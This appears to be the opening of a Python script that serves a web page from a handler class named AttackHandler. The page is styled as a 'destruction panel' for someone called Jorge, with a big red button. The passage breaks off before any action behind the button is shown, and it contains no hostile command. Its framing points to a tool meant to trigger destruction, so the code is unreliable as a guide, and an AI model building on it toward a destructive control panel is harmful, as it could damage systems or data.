import os
class AttackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            # La página con el botón de Jorge
            html = '''
            <html>
            <head><title>SISTEMA JORGE</title><style>
                body{background:black;color:red;font-family:monospace;text-align:center;padding:50px}
                button{background:red;color:white;padding:40px;font-size:30px;border-radius:20px;box-shadow:0 0 50px red;cursor:pointer}
            </style></head>
            <body>
                <h1>☢️ PANEL DE DESTRUCCIÓN JORGE ☢️</h1>
